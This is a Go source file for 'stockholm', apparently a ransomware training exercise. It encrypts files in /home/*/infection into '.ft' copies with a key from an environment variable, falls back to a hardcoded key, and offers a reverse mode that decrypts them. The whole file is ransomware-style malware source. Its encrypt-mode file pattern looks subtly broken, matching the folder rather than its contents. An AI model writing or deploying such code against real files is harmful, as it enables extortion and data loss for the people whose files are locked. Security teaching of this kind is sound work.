package main

import (
	"fmt"
	"os"
	"strings"
	"path/filepath"
	"crypto/sha256"

	"stockholm/crypt"
)

type StockholmOptions struct {
	key []byte 
	silent bool
	reverse bool
}

func ErrorExit(err error) {
	fmt.Println(err)
	os.Exit(1)
}

func hasFlag(args []string, flags ...string) bool {
	for _, arg := range args {
		for _, f := range flags {
			if arg == f {
				return true
			}
		}
	}
	return false
}

func getInfoFlags(argList []string) () {
	if hasFlag(argList, "-h", "--help") {
		fmt.Println("Stockholm help:")
		fmt.Println("-h, --help: Show this help menu")
		fmt.Println("-v, --version: Get version number")
		fmt.Println("-r, --reverse: Reverse the encryption on .ft files")
		fmt.Println("-s, --silent: Silences output during encryption or decryption")
		os.Exit(0)
	}
	if hasFlag(argList, "-v", "--version") {
		fmt.Println("stockholm version 0.1.0")
		os.Exit(0)
	}
}

func parser(argList []string) (*StockholmOptions, error) {
	getInfoFlags(argList)
	ret := StockholmOptions{
		key: []byte(""),
		silent: false,
		reverse: false,
	}
	key_value := os.Getenv("STOCKHOLM_KEY")
	if key_value == "" {
		fmt.Println("STOCKHOLM env value not set or empty")
		fmt.Println("Using fallback")
		key_value = "ALLYOURBASESAREBELONGTOUS"
	}
	hash := sha256.Sum256([]byte(key_value))
	ret.key = hash[:]


	if hasFlag(argList, "-s", "--silent") {
		ret.silent = true
	}
	if hasFlag(argList, "-r", "--reverse") {
		ret.reverse = true
	}
	return &ret, nil
}

// Retrieve the content of the infection dir
func getInfectionFiles(reverse bool) ([]string, error) {
	pattern := "/home/*/infection"
	if reverse {
		pattern = "/home/*/infection/*.ft"
	}

	matches, _ := filepath.Glob(pattern)
	for _, path := range matches {
		fmt.Println("Found:", path)
	}
	return matches, nil
}

func reverseInfection(opts *StockholmOptions) {
	files, err := getInfectionFiles(opts.reverse)
	if err != nil {
		ErrorExit(err)
	}
	for _, file := range(files) {
		cleaned := strings.TrimSuffix(file, ".ft")
		err = crypt.DecryptFile(opts.key, file, cleaned)
		if err != nil {
			fmt.Println(err)
		}
		if !opts.silent {
			fmt.Printf("[%s] infection reversed\n", file)
		}
	}
}

func runInfection(opts *StockholmOptions) {
	files, err := getInfectionFiles(opts.reverse)
	if err != nil {
		ErrorExit(err)
	}
	for _, file := range(files) {
		err = crypt.EncryptFile(opts.key, file, file + ".ft")
		if err != nil {
			fmt.Println(err)
		}
		if !opts.silent {
			fmt.Printf("[%s] infected\n", file)
		}
	}
}

func main() {
	fmt.Println("Program started")
	opts, err := parser(os.Args)
	if err != nil {
		ErrorExit(err)
	}
	if opts.reverse == true {
		reverseInfection(opts)
	} else {
		runInfection(opts)
	}
	fmt.Println("Done.")
}
